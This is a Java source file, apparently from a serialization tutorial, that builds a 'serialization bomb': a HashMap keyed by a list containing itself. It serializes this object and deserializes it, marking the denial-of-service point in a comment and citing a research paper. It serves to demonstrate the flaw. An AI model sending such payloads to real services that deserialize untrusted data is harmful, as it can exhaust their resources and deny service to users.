package com.mkyong.io.object.serialization;

import com.mkyong.io.utils.SerializeUtil;

import java.util.*;

public class TestExample {

    // https://homepages.ecs.vuw.ac.nz/~alex/files/DietrichJezekRasheedTahirPotaninECOOP2017.pdf
    public static void main(String[] args) {
        System.out.println(bomb().length);
        SerializeUtil.deserialize(bomb());  // Dos here
        System.out.println("Done");
    }

    static byte[] bomb() {
        HashMap map = new HashMap() ;
        List list = new ArrayList() ;
        map.put(list ,"");
        list.add(list);
        return SerializeUtil.serialize(map);
    }

}
